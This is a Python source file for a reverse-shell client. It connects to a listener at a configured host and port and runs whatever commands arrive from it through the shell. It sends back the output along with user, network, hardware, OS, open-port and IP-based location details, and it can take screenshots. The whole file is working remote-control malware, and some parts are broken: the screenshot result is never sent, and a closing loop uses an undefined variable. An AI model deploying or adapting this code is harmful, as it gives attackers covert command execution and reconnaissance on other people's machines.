import os
import socket
import subprocess
import sys
import time

def receiver(s): #RECEIVE COMMANDS and handle them
    while True:
        cwd = os.getcwd() + " "
        s.send(cwd.encode())

        cmd = s.recv(BUFFER).decode("utf-8")
        print(cmd)
        #customized commands
        if cmd.lower().startswith("cd "):
            try:
                os.chdir(cmd[3:])
                s.send(b"$> ")
                continue
            except FileNotFoundError as e:
                message = (str(e) + "\n$> ").encode() 
                s.send(message)

                continue

        elif cmd.lower() == "help":
            message = """\nList of commands available:\n
    Infos           Get Device Informations
    Listen          List Of Open Ports
    Screenshot      Receive Screenshot
    Help            Open List Of Available Commands 
    Quit            Close Connection   

$> """.encode()
            s.send(message)

        elif cmd.lower() == "quit":
            #message = f"\n[x] Cutting connection with {HOST}\n".encode()
            #s.send(message)
            sys.exit()

        elif cmd.lower() == "infos":
            #Username
            cm = "whoami" 
            output = subprocess.getoutput(cm)
            message = f"\nUSER\n\nUsername    {output}\n"

            #groups and permissions
            output = subprocess.getoutput('id ' + output)
            message += f"Groups      {output}\n"

            #cm = s.ipgrab()

            #ipv4 address
            cm = "ip addr show eth0 | grep -w inet | awk '{ print $2 }'"
            # ip addr show eth0 | grep -w net | awk '{ print $2 }' | awk -F "\" '{ print $1 }'
            output = subprocess.getoutput(cm)
            message += f"\nNETWORK\n\nipv4        {output}\n"

            #ipv6 address
            cm = "ip addr show eth0 | grep inet6 | awk '{ print $2 }'"
            output = subprocess.getoutput(cm)
            message += f"ipv6        {output}\n"

            #MAC 
            cm = "ip link show eth0 | awk '/ether/ { print$2 }'"
            output = subprocess.getoutput(cm)
            message += f"MAC         {output}\n"

            #CPU 
            cm = "cat /proc/cpuinfo | grep 'model name' | uniq | awk -F: '{print$2}'"
            output =subprocess.getoutput(cm)
            message += f"\nCOMPONENTS\n\nCPU        {output}\n"

            #Architecture
            cm = "lscpu | grep Architecture | awk '{print$2}'"
            output = subprocess.getoutput(cm)
            message += f"Arch        {output}\n"
            
            #RAM
            cm = "cat /proc/meminfo | grep MemTotal | awk -F: '{print$2}'"
            output =subprocess.getoutput(cm)
            message += f"RAM {output}\n"

            # OS NAME
            cm = "cat /etc/os-release | grep PRETTY"
            output = subprocess.getoutput(cm)
            output = output.split('"')[1]
            message += f"OS          {output}\n"
            
            # OS VERSION
            cm = "cat /etc/os-release | grep VERSION"
            output = subprocess.getoutput(cm)
            output = output.split('"')[1]
            message += f"OS ver      {output}\n"
            
            #city
            cm = "wget -qO- https://ipinfo.io | grep city | awk '{print$2}'"
            output = subprocess.getoutput(cm) 
            message += f"\nPLACE\n\nLocation    {output} "

            # regione
            cm = "wget -qO- https://ipinfo.io | grep region | awk '{print$2}'"
            output = subprocess.getoutput(cm) 
            message += f"{output} "

            #country
            cm = "wget -qO- https://ipinfo.io | grep country | awk '{print$2}'"
            output = subprocess.getoutput(cm).rstrip(',')
            message += f"{output}\n\n$> "
            message=message.encode()
            s.send(message)

        elif cmd.lower() == "listen":
            cm = "ss -tuln"
            output = subprocess.getoutput(cm) 
            message = f"{output}\n$> ".encode()
            s.send(message)

        elif cmd.lower() == "screenshot":
            cm = "scrot"
            output = subprocess.getoutput(cm) 
            #if output 
            message = f"{output}\n$> ".encode()
        
        #standard shell commands
        elif len(cmd) > 0:
            p = subprocess.run(cmd, shell=True, capture_output=True)
            data = p.stdout + p.stderr
            s.send(data + b"$> ")    


def connect(address):   
    try:
        s = socket.socket()
        s.connect(address)
        print("Connection established")
        print(f"Address: {address}")
    except socket.error as error:
        print(f"Something went wrong. Check infos:")
        print(error)
        sys.exit()
    receiver(s)


if __name__ == "__main__":
    HOST = "127.0.0.1"
    port = 8888
    BUFFER = 4096
    connect((HOST, port))

    while True:
        time.sleep(i*15)
